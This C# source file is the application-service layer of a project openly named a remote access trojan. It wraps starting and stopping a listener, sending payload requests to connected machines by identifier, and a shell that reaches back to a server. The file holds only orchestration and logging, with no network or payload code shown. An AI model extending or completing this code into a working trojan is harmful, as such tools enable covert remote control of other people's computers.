using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Company.Tools.RemoteAccessTrojan.Infrastructure.Logging;
using Company.Tools.RemoteAccessTrojan.Domain.Models;

namespace Company.Tools.RemoteAccessTrojan.Application
{
    internal class ApplicationService : IApplicationService
    {
        #region Instances

        private readonly Logger Logger = new LoggerFactory().Create();

        #endregion

        #region Methods

        #region Exposed

        public Listener StartListener()
        {
            try
            {
                var listener = new ListenerFactory().Create();
                listener.Start();
                return listener;
            }
            catch (Exception ex)
            {
                this.Logger.WriteException(ex);
                throw;
            }
        }

        public void StopListener(Listener listener)
        {
            try
            {
                listener.Stop();
            }
            catch (Exception ex)
            {
                this.Logger.WriteException(ex);
                throw;
            }
        }

        public string SendPayload(Listener listener, Guid connectionIdentifier, string request)
        {
            try
            {
                var response = listener.SendPayload(connectionIdentifier, request);
                return response;
            }
            catch (Exception ex)
            {
                this.Logger.WriteException(ex);
                throw;
            }
        }

        public void ReachServer()
        {
            try
            {
                var shell = new ShellFactory().Create();
                shell.ReachServer();
            }
            catch (Exception ex)
            {
                this.Logger.WriteException(ex);
                throw;
            }
        }

        #endregion

        #endregion
    }
}